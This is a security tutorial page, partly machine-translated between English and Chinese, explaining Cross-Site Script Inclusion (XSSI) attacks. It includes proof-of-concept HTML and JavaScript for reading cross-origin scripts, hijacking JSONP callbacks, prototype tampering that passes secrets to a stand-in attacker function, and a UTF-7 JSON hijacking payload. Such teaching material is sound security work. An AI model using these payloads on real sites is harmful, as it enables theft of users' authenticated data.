# XSSI (Cross-Site Script Inclusion)

#### The information was taken from [https://www.scip.ch/en/?labs.20160414](https://www.scip.ch/en/?labs.20160414)

## Basic Information

XSSI 漏洞，它利用以下情况：当使用 `script` 标签包含资源时，同源策略（SOP） 将再不适用，因为脚本必须能够跨域包含。因此，攻击者可以读取使用 `script` 标签包含的所有内容。

当涉及到动态 JavaScript 或 JSONP 时，当所谓的环境权限信息（如 cookie）用于身份验证时，这一点尤其有趣。当从不同的主机请求资源时会包含 cookie。

### Types

1. Static JavaScript (regular XSSI)
2. Static JavaScript, which is only accessible when authenticated
3. Dynamic JavaScript
4. Non-JavaScript

## 常规的 XSSI

私有信息位于全局可访问的 JS 文件中，您可以通过读取文件、搜索关键字或使用正则表达式来检测它。\
要利用这一点，只需在恶意内容中包含带有私人信息的脚本：

```markup
<script src="https://www.vulnerable-domain.tld/script.js"></script>
<script> alert(JSON.stringify(confidential_keys[0])); </script>
```

## Dynamic-JavaScript-based-XSSI and  Authenticated-JavaScript-XSSI

**Confidential【机密】 information is added to the script when a user requests it**. This can be easily discovered by sending the request **with and without the cookies**, if **different information** is retrieved, then confidential information could be contained. To do this automatically you can use burp extension: [https://github.com/luh2/DetectDynamicJS](https://github.com/luh2/DetectDynamicJS).

如果信息位于全局变量中，您可以使用与前一种情况相同的代码来利用它。\
如果机密数据在 JSONP 响应中发送，您可以重写执行的函数来检索信息：

```markup
<script>
      //The confidential info will be inside the callback to angular.callbacks._7: angular.callbacks._7({"status":STATUS,"body":{"demographics":{"email":......}}})
      var angular = function () { return 1; };
      angular.callbacks = function () { return 1; };      
      angular.callbacks._7 = function (leaked) {
	  alert(JSON.stringify(leaked));
      };  
</script>
<script src="https://site.tld/p?jsonp=angular.callbacks._7" type="text/javascript"></script>
```

Or you could also set a prepared function to be executed by the JSONP response:

```markup
<script>
      leak = function (leaked) {
	  alert(JSON.stringify(leaked));
      };  
</script>
<script src="https://site.tld/p?jsonp=leak" type="text/javascript"></script>
```


如果变量不在全局命名空间内，有时可以使用 _prototype tampering_ 来利用它。原型篡改滥用了 JavaScript 的设计，即在解释代码时，JavaScript 会遍历原型链找到被调用的属性。以下示例摘自论文 [The Unexpected Dangers of Dynamic JavaScript](https://www.usenix.org/system/files/conference/usenixsecurity15/sec15-paper-lekies.pdf) 并演示了如何覆盖相关函数`Array` 类型和对 `this` 的访问，非全局变量也可能被泄露。
 
```javascript
(function(){
  var arr = ["secret1", "secret2", "secret3"];
  // intents to slice out first entry
  var x = arr.slice(1);
  ...
})();
```

在原始代码中，`Array` 类型的`slice` 访问我们感兴趣的数据。如前文所述，攻击者可以覆盖`slice` 并窃取机密。

```javascript
Array.prototype.slice = function(){
  // leaks ["secret1", "secret2", "secret3"]
  sendToAttackerBackend(this);
};
```

Security Researcher [Sebastian Lekies](https://twitter.com/slekies) just recently updated his list of [vectors](http://sebastian-lekies.de/leak/).

## &#x20;Non-Script-XSSI

Takeshi Terada 在他的论文 [基于标识符的 XSSI 攻击] (https://www.mbsd.jp/Whitepaper/xssi.pdf) 中描述了另一种 XSSI。他能够通过在 `script` 标签中包含 CSV 文件作为源，使用数据作为变量和函数名称来跨源泄漏非脚本文件。

第一次公开记录的 XSSI 攻击是在 2006 年。Jeremiah Grossman 的博客文章 [使用 GMail 的高级 Web 攻击技术](http://jeremiahgrossman.blogspot.ch/2006/01/advanced-web-attack-techniques-using.html) 描述了一个 XSSI，它通过覆盖 `Array` 构造函数能够读取 google 帐户的完整地址簿。

2007 年 Joe Walker 发表了 [JSON 不像人们想象的那样安全](http://incompleteness.me/blog/2007/03/05/json-is-not-as-safe-as-people-think-它是/）。他使用相同的想法来窃取 `Array` 中的 JSON。

Other related attacks were conducted【实施】 by injecting UTF-7 encoded content into the JSON to escape the JSON format. It is described by Gareth Heyes, author of [Hackvertor](https://hackvertor.co.uk/public), in the blog entry [JSON Hijacking](http://www.thespanner.co.uk/2011/05/30/json-hijacking/) released in 2011. In a quick test, this was still possible in Microsoft Internet Explorer and Edge, but not in Mozilla Firefox or Google Chrome.

JSON with UTF-7:

```javascript
[{'friend':'luke','email':'+ACcAfQBdADsAYQBsAGUAcgB0ACgAJwBNAGEAeQAgAHQAaABlACAAZgBvAHIAYwBlACAAYgBlACAAdwBpAHQAaAAgAHkAbwB1ACcAKQA7AFsAewAnAGoAbwBiACcAOgAnAGQAbwBuAGU-'}]
```

Including the JSON in the attacker’s page

```markup
<script src="http://site.tld/json-utf7.json" type="text/javascript" charset="UTF-7"></script>
```
